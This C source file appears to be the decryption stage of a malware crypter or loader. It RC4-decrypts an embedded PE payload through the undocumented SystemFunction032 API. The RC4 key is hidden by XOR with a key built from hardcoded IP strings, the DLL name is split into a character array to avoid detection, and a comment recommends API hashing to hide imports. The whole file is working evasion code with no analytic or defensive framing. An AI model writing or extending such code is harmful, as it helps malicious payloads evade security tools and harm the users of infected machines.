#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"


/*-------------------------------------
  Simple XoRing function
-------------------------------------*/
VOID XoR(PBYTE pMessage, size_t sMsg_size, PBYTE key, size_t key_size) {
	for (size_t i = 0; i < sMsg_size; i++) {
		pMessage[i] = pMessage[i] ^ key[i % key_size];
	}
}


/*------------------------------------
 Get XoR key from an IP strings
------------------------------------*/
char* GenKeyIP(char ips[][15], size_t count) {
	// Buffer to hold the hex data
	static char buffer[50];
	buffer[0] = '\0';

	for (int i = 0; i < count; i++) {
		// Separate each octet
		char* part = strtok((char*)ips[i], ".");
		while (part != NULL) {
			// Convert to int
			int octet = atoi(part);
			// Define var for the hex representation
			char hex[3];
			// Convert to hex and store in the var
			sprintf(hex, "%02X", octet);
			// Concatenate all hex octets
			strcat(buffer, hex);
			part = strtok(NULL, ".");
		}
	}
	return buffer;
}



/*------------------------------------
 Simple RC4 based encryption function
------------------------------------*/
BOOL rc4enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData) {

	DEBUG_PRINT("[*] Crypt processing PE with size: %d.\n", sData);
	NTSTATUS status = NULL;
	USTRING Key = {
		.Length = dwKey,
		.MaximumLength = dwKey,
		.Buffer = pKey
	};

	USTRING Data = {
		.Length = sData,
		.MaximumLength = sData,
		.Buffer = pData
	};

	unsigned char lib[] = { 'C', 'R', 'Y', 'P', 'T', 'S', 'P', '.', 'D', 'L', 'L', '\0' };
	HMODULE hModule = LoadLibraryA(lib);
	fnSF032 sf32 = (fnSF032)GetProcAddress(hModule, "SystemFunction032");  //Make use of API hashing instead of hardcoding the name

	status = sf32(&Data, &Key);
	FreeLibrary(hModule);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Operation failed with status: %d\n", status);
		return FALSE;
	};
	//DEBUG_PRINT("[*] Crypt finished!\n");
	return TRUE;
}



/*-------------------------------------------
 PE decryption function
-------------------------------------------*/
BOOL Crypt(PCONTENT cnt) {
	//Encryption key
	char ekey[] = { 0x4e,0x62,0x51,0x25,0x3a,0x53,0x4a,0x3b,0x5d,0x7b,0x6b,0x21,0x57,0x75,0x4b,0x72,0x3a,0x68,0x21,0x38,0x4a,0x25,0x34,0x40,0x46,0x58,0x61,0x79,0x4d,0x71,0x57,0x21,0x7d,0x62,0x56,0x5d,0x48,0x23,0x5d,0x4e,0x61,0x5d,0x32,0x71,0x45,0x69,0x5b,0x52,0x7d,0x61,0x4a,0x34,0x2f,0x2a,0x3a,0x45,0x35,0x32,0x25,0x2b,0x2c,0x69,0x54,0x00 };

	//Seed for XOR key
	char ips[][15] = {
	   "192.168.100.52",
	   "10.10.10.12",
	   "172.16.132.123",
	   "152.77.83.151"
	};

	char* xkey = GenKeyIP(ips, sizeof(ips) / sizeof(ips[0]));
	XoR(ekey, sizeof(ekey), xkey, strlen(xkey));

	DWORD scSize = cnt->size;

	if (!rc4enc(&ekey, cnt->data, sizeof(ekey), scSize)) {
		DEBUG_PRINT("[!] Crypt operation failed.\n");
		return FALSE;
	}
	return TRUE;
}